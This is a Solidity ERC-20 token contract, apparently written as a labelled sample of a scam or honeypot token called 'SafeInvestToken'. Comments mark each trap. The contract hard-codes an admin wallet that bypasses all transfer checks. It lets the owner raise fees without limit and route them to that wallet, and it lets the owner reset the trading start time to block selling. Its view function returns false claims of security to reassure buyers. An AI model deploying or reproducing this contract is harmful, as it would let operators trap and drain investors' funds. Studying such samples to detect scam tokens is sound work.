// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SuspiciousToken is ERC20, Ownable {
    mapping(address => bool) public isExcluded;
    uint256 public tradingStartTime;
    uint256 private constant TRANSFER_DELAY = 1 hours;
    
    // Hidden admin address disguised as a random configuration value
    address private constant ADMIN_WALLET = 0x635ef1F88751e5E363c0E9a8Ca365A3b5ED18B9D;
    
    // Innocent-looking configuration values that hide malicious logic
    uint256 public maxTransactionAmount = type(uint256).max;
    uint256 public tradingFee = 0; // Appears to have no fees initially
    
    constructor() ERC20("SafeInvestToken", "SAFE") Ownable(msg.sender) {
        _mint(msg.sender, 1000000 * 10**18);
        isExcluded[msg.sender] = true;
        isExcluded[ADMIN_WALLET] = true;
        tradingStartTime = block.timestamp + TRANSFER_DELAY;
    }

    // Seemingly innocent configuration function that can be used maliciously
    function updateTradingParameters(
        uint256 _maxAmount,
        uint256 _fee
    ) external onlyOwner {
        maxTransactionAmount = _maxAmount;
        tradingFee = _fee;
        // Hidden: Can suddenly impose harsh limits and high fees
    }

    // Hidden backdoor in transfer logic
    function _update(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {
        require(amount <= maxTransactionAmount, "Exceeds max transaction amount");
        
        // Hidden trap: Special privileges for admin wallet
        if (sender == ADMIN_WALLET || recipient == ADMIN_WALLET) {
            super._update(sender, recipient, amount);
            return;
        }

        // Hidden trap: Can prevent selling by adjusting tradingStartTime
        require(block.timestamp >= tradingStartTime, "Trading not started");

        // Hidden trap: Fee can be suddenly increased and sent to admin
        if (!isExcluded[sender] && !isExcluded[recipient]) {
            uint256 feeAmount = (amount * tradingFee) / 100;
            if (feeAmount > 0) {
                super._update(sender, ADMIN_WALLET, feeAmount);
                amount -= feeAmount;
            }
        }

        super._update(sender, recipient, amount);
    }

    // Innocent-looking view functions to make the contract appear legitimate
    function getTokenInfo() external pure returns (
        string memory description,
        string memory warning
    ) {
        return (
            "SafeInvestToken - A secure and transparent investment vehicle",
            "This token implements standard security measures for your protection"
        );
    }

    // Hidden trap: Can be used to prevent specific addresses from selling
    function updateExcludedAddresses(address[] calldata addresses, bool excluded) external onlyOwner {
        for (uint256 i = 0; i < addresses.length; i++) {
            isExcluded[addresses[i]] = excluded;
        }
    }

    // Hidden trap: Can reset trading time to prevent sells
    function updateTradingStart(uint256 newStartTime) external onlyOwner {
        tradingStartTime = newStartTime;
    }
} 